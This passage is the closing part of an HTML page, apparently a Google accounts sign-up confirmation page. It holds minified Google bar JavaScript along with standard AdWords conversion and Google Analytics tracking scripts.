_.ib(function(){if(Cw()){var a=window.document.querySelector(".gb_e"),c=Cw()||new Bw,c=_.C(_.z(c,1),!1),c=new Dw(c);a&&c.o&&c.b(a,!1)}});var Fw=function(a,c,d,e){_.qg.call(this,a,d);this.U=e;this.A=new Dw(_.C(_.z(c,1),!1));this.K=_.Fp.M();this.C=_.S("gb_ba",this.o);this.A.o&&(this.w=!1,_.op()&&(_.R(this.o,"gb_o"),_.Rf(this.o,["gb_Uc","gb_ra","gb_Oc"]),this.V=_.Bf(this.o,"width"),this.Z=_.Bf(this.C,"width"),d=this.o,_.R(d,"gb_Oc"),_.Q(d,"gb_o"),this.N=_.Bf(this.o,"width"),this.W=_.Bf(this.C,"width"),_.Sf(this.o,["gb_Uc","gb_ra","gb_o"])),Ew(this),this.K.C("hrc",this.jg,this),d=_.S("gb_Qc",this.o),this.b(d,"click",this.Yf),d=_.S("gb_Rc",
this.o),this.b(d,"click",this.zg));this.D=_.C(_.z(c,2),!1);this.L=_.C(_.z(c,4),!1);this.T=null;this.D&&(this.T=_.z(c,3));if(this.D||this.L)this.H(a,["mouseover","touchstart"],this.Ce),a=new _.jl(a),this.H(a,"focusin",this.Ce);(a=_.S("gb_ic",this.o))&&_.dg(this,a,this.Eg,!1,this)};_.v(Fw,_.qg);_.k=Fw.prototype;_.k.Eg=function(){this.U.log(9,{l:"i"})};_.k.jg=function(){Ew(this)};_.k.Yf=function(){0!=this.w&&(this.w=!1,Ew(this,!0))};_.k.zg=function(){1!=this.w&&(this.w=!0,Ew(this,!0))};
_.k.Ce=function(){if(this.D){var a=this.T;_.cc(_.Yb.M(),a,void 0)}this.L&&this.o.setAttribute("activated","1")};var Ew=function(a,c){var d=c&&_.op();0==a.A.w.B?d?(_.Rf(a.o,["gb_Tc","gb_q"]),_.tp(a.o),a.H(a.o,_.ne,a.R),a.F(!0),(0,window.setTimeout)((0,_.t)(a.A.b,a.A,a.o,a.w),0),(0,window.setTimeout)((0,_.t)(a.F,a,!1),0)):(a.A.b(a.o,a.w),_.op()&&a.F(!1)):(_.R(a.o,"gb_Tc"),a.A.b(a.o,a.w),Gw(a.o,""),Gw(a.C,""),a.K.Pa(!0))}; Fw.prototype.F=function(a){a=this.w?!a:a;Gw(this.o,a?this.V:this.N);Gw(this.C,a?this.Z:this.W)};Fw.prototype.R=function(){_.R(this.o,"gb_q")};var Gw=function(a,c){a.style.minWidth=a.style.maxWidth=c};
_.ib(function(){var a=Cw()||new Bw,c=_.S("gb_e");if(a&&c){var d=_.U(),e=_.pc();new Fw(c,a,d,e);_.z(a,4)&&(d=function(){var c=_.z(a,5);_.ac(_.Yb.M(),c,void 0)},"1"==c.getAttribute("activated")?d():(_.Qe(c,["mouseover","touchstart"],d),c=new _.jl(c),_.Qe(c,"focusin",d)))}});

}catch(e){_._DumpException(e)}
try{
var Lo=function(a){_.G.call(this);this.C=a;this.B=this.b=null;this.o={};this.A={};this.w={}};_.v(Lo,_.G);_.k=Lo.prototype;_.k.Ve=function(a){a&&this.b&&a!=this.b&&this.b.close();this.b=a};_.k.Je=function(a){a=this.w[a]||a;return this.b==a};_.k.Jh=function(a){this.B=a};_.k.Ie=function(a){return this.B==a};_.k.fd=function(){this.b&&this.b.close();this.b=null};_.k.rf=function(a){this.b&&this.b.getId()==a&&this.fd()};_.k.Pb=function(a,c,d){this.o[a]=this.o[a]||{};this.o[a][c]=this.o[a][c]||[];this.o[a][c].push(d)};
_.k.dd=function(a,c){var d=c.getId();if(this.o[a]&&this.o[a][d])for(var e=0;e<this.o[a][d].length;e++)try{this.o[a][d][e]()}catch(f){this.C.log(f)}};_.k.Lh=function(a,c){this.A[a]=c};_.k.pf=function(a){return!this.A[a.getId()]};_.k.Vg=function(){return!!this.b&&this.b.$};_.k.of=function(){return!!this.b};_.k.Ne=function(){this.b&&_.Bg(this.b)};_.k.Ze=function(a){this.w[a]&&(this.b&&this.b.getId()==a||this.w[a].open())};_.k.jh=function(a){this.w[a.getId()]=a};var Mo=new Lo(_.U());_.Ra("dd",Mo);
_.u("gbar.close",(0,_.t)(Mo.fd,Mo));_.u("gbar.cls",(0,_.t)(Mo.rf,Mo));_.u("gbar.abh",(0,_.t)(Mo.Pb,Mo,0));_.u("gbar.adh",(0,_.t)(Mo.Pb,Mo,1));_.u("gbar.ach",(0,_.t)(Mo.Pb,Mo,2));_.u("gbar.aeh",(0,_.t)(Mo.Lh,Mo));_.u("gbar.bsy",(0,_.t)(Mo.Vg,Mo));_.u("gbar.op",(0,_.t)(Mo.of,Mo));

}catch(e){_._DumpException(e)}
try{
var Bi=window.document.querySelector(".gb_Fa"),Ci=/(\s+|^)gb_fc(\s+|$)/;Bi&&!Ci.test(Bi.className)&&_.gh("gb_Fa");
}catch(e){_._DumpException(e)}
try{
_.gh("gb_p");
}catch(e){_._DumpException(e)}
try{
_.gh("gb_nc");
}catch(e){_._DumpException(e)}
})(this.gbar_);
// Google Inc.

  </script>
<script>
  (function() {
  var gb = document.getElementById('gb');
  var arrow = document.getElementById('profile-arrow');
  if (gb && arrow && (gb.offsetHeight < 69)) {
      arrow.style.top = gb.offsetHeight  + 5 + 'px';
    }
  })();
</script>
<script type="text/javascript">
  var google_conversion_id = 1069902127;
  var google_conversion_language = "en_US";
  var google_conversion_format = "1";
  var google_conversion_color = "FFFFFF";
  if (1) {
  var google_conversion_value = 1;
  }
  var google_conversion_label = "Default";
</script>
<script src="//www.googleadservices.com/pagead/conversion.js"></script>
<script type="text/javascript">
  var google_conversion_id = 1059946869;
  var google_conversion_language = "en";
  var google_conversion_format = "1";
  var google_conversion_color = "666666";
  var google_conversion_label = "default";
  var google_conversion_value = 1;
</script>
<script src="//www.googleadservices.com/pagead/conversion.js"></script>
<script type="text/javascript">
  var google_conversion_id = 1003973848;
  var google_conversion_language = "en";
  var google_conversion_format = "2";
  var google_conversion_color = "ffffff";
  var google_conversion_label = "79-TCMiT7wIQ2Nnd3gM";
  var google_conversion_value = 0;
</script>
<script src="//www.googleadservices.com/pagead/conversion.js"></script>
<script type="text/javascript">
  var google_conversion_id = 1016317401;
  var google_conversion_language = "en";
  var google_conversion_format = "3";
  var google_conversion_color = "ffffff";
  var google_conversion_label = "aj5xCO_O6QIQ2YvP5AM";
  var google_conversion_value = 0;
</script>
<script src="//www.googleadservices.com/pagead/conversion.js"></script>
<script type="text/javascript">
  var google_conversion_id = 1016680173;
  var google_conversion_language = "en";
  var google_conversion_format = "3";
  var google_conversion_color = "ffffff";
  var google_conversion_label = "PMT8CMPEqwIQ7Z3l5AM";
  var google_conversion_value = 0;
</script>
<script src="//www.googleadservices.com/pagead/conversion.js"></script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-992684-1']);
  _gaq.push(['_setDomainName', 'accounts.google.com']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_addIgnoredRef', 'mail.google.com']);
  _gaq.push(['_addIgnoredRef', 'plus.google.com']);
  _gaq.push(['_setAllowAnchor', true]);
  _gaq.push(['_trackPageview', '/SignUpDone']);
  (function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
  })();
</script>
  </div>
  </body>
</html>
